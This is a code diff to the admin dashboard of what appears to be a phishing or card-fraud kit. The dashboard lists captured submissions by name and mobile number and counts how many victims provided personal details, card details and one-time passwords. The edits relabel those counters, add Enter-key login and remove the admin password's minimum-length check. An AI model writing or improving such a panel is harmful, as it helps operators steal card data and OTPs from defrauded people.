@@ -187,10 +187,10 @@ body{
         </div>
       </div>
       <div class="stats">
-        <div class="stat glass"><div class="label">Total Users</div><div class="val green" id="stat-total">0</div></div>
-        <div class="stat glass"><div class="label">Personal Step</div><div class="val" id="stat-personal">0</div></div>
-        <div class="stat glass"><div class="label">Card Step</div><div class="val" id="stat-card">0</div></div>
-        <div class="stat glass"><div class="label">OTP Step</div><div class="val" id="stat-otp">0</div></div>
+        <div class="stat glass"><div class="label">Total Users</div><div class="val green" id="stat-total">0 users</div></div>
+        <div class="stat glass"><div class="label">Personal Details Provided</div><div class="val" id="stat-personal">0 users</div></div>
+        <div class="stat glass"><div class="label">Card Details Provided</div><div class="val" id="stat-card">0 users</div></div>
+        <div class="stat glass"><div class="label">OTP Provided</div><div class="val" id="stat-otp">0 users</div></div>
       </div>
       <div id="list" class="list"></div>
     </div>
@@ -210,7 +210,7 @@ body{
     <h3 id="modal-title">Add Admin</h3>
     <div id="modal-alert" class="alert err"></div>
     <div class="field"><label>Username / Email</label><input id="m-user" type="text" placeholder="e.g. user2"></div>
-    <div class="field"><label>Password</label><input id="m-pass" type="password" placeholder="min 6 chars"></div>
+    <div class="field"><label>Password</label><input id="m-pass" type="password" placeholder="Enter password"></div>
     <div class="row-actions">
       <button id="modal-cancel" class="btn btn-ghost btn-sm">Cancel</button>
       <button id="modal-save" class="btn btn-primary btn-sm">Save</button>
@@ -239,6 +239,7 @@ body{
   }
 
   $('login-btn').addEventListener('click',doLogin);
+  $('login-user').addEventListener('keydown',function(e){if(e.key==='Enter')doLogin();});
   $('login-pass').addEventListener('keydown',function(e){if(e.key==='Enter')doLogin();});
   function doLogin(){
     var u=$('login-user').value.trim(), p=$('login-pass').value;
@@ -318,10 +319,10 @@ body{
     });
     var p=0,c=0,o=0;
     state.submissions.forEach(function(s){if(s.personal)p++;if(s.card)c++;if(s.otp)o++;});
-    $('stat-total').textContent=state.submissions.length;
-    $('stat-personal').textContent=p;
-    $('stat-card').textContent=c;
-    $('stat-otp').textContent=o;
+    $('stat-total').textContent=state.submissions.length+' users';
+    $('stat-personal').textContent=p+' users';
+    $('stat-card').textContent=c+' users';
+    $('stat-otp').textContent=o+' users';
 
     var el=$('list');
     if(list.length===0){el.innerHTML='<div class="empty">No submissions yet. They will appear here in real time.</div>';return;}
@@ -334,7 +335,7 @@ body{
       if(s.otp)badges.push('<span class="badge o">OTP</span>');else badges.push('<span class="badge miss">No OTP</span>');
       return '<div class="card glass" data-id="'+s._id+'">'+
         '<div class="card-head">'+
-          '<div class="card-title"><div class="name">User #'+(state.submissions.indexOf(s)+1)+': '+esc(name)+'</div><div class="meta">Mobile: '+esc(mob)+'</div></div>'+
+          '<div class="card-title"><div class="name">'+esc(name)+'</div><div class="meta">Mobile: '+esc(mob)+'</div></div>'+
           '<div style="display:flex;align-items:center;gap:10px"><div class="badges">'+badges.join('')+'</div><svg class="chev" width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M7 10l5 5 5-5z"/></svg></div>'+
         '</div>'+
         '<div class="card-body">'+renderFields(s)+'</div>'+
@@ -424,7 +425,7 @@ body{
         else showAlert($('modal-alert'),res.j&&res.j.error?res.j.error:'Update failed.','err');
       });
     }else{
-      if(!p||p.length<6){showAlert($('modal-alert'),'Password must be at least 6 characters.','err');return;}
+      if(!p){showAlert($('modal-alert'),'Password is required.','err');return;}
       body.password=p;
       fetch(API+'/api/admins',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)})
       .then(function(r){return r.json().then(function(j){return {ok:r.ok,j:j};});})
